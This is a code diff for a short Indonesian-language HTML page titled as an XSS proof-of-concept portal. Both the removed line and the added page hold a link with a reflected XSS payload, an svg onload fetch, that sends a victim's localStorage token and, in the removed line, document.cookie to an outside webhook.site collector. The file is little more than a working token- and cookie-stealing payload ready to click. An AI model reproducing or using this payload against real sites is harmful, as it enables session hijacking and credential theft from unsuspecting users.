@@ -1,1 +1,17 @@
-<a href="https://0x403for.github.io/testing.html?name=%3Csvg/onload=%22fetch('https://webhook.site/3408cdba-02da-45bd-9980-d6ad95ca1594?data='%2bencodeURIComponent(localStorage.getItem('token')||document.cookie))%22%3E">Klik Disini untuk Uji Payload</a>
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Portal Pengujian PoC</title>
+</head>
+<body>
+    <h2>Halaman Utama Eksperimen XSS</h2>
+    <p>Silakan uji tautan di bawah ini agar langsung terbuka tanpa lari ke Google:</p>
+
+    <!-- Tombol pemicu payload -->
+    <a href="testing.html?name=%3Csvg/onload=%22fetch('https://webhook.site/3408cdba-02da-45bd-9980-d6ad95ca1594?token='+encodeURIComponent(localStorage.getItem('token')||'test_data'))%22">
+        👉 Klik untuk Tes Payload XSS ke Webhook
+    </a>
+</body>
+</html>
